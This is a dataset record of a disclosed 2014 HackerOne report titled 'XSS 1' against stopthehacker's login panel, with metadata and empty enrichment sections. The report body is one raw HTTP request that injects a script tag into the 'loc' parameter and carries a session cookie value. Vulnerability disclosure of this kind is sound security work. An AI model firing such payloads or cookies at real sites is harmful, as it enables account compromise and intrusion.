---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '9230'
original_report_id: '9230'
title: XSS 1
weakness: Cross-site Scripting (XSS) - Generic
team_handle: stopthehacker
created_at: '2014-04-22T22:19:33.440Z'
disclosed_at: '2014-07-18T16:19:13.565Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS 1

## Metadata

- HackerOne Report ID: 9230
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: stopthehacker
- Disclosed At: 2014-07-18T16:19:13.565Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Request
GET /login/?loc=de"><script>prompt(994787)</script> HTTP/1.1
Referer: https://panel.stopthehacker.com
Cookie: sth_panel=9fj5MyELdr2SAJ3yNP5p%2C3
Host: panel.stopthehacker.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36
Accept: */*

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
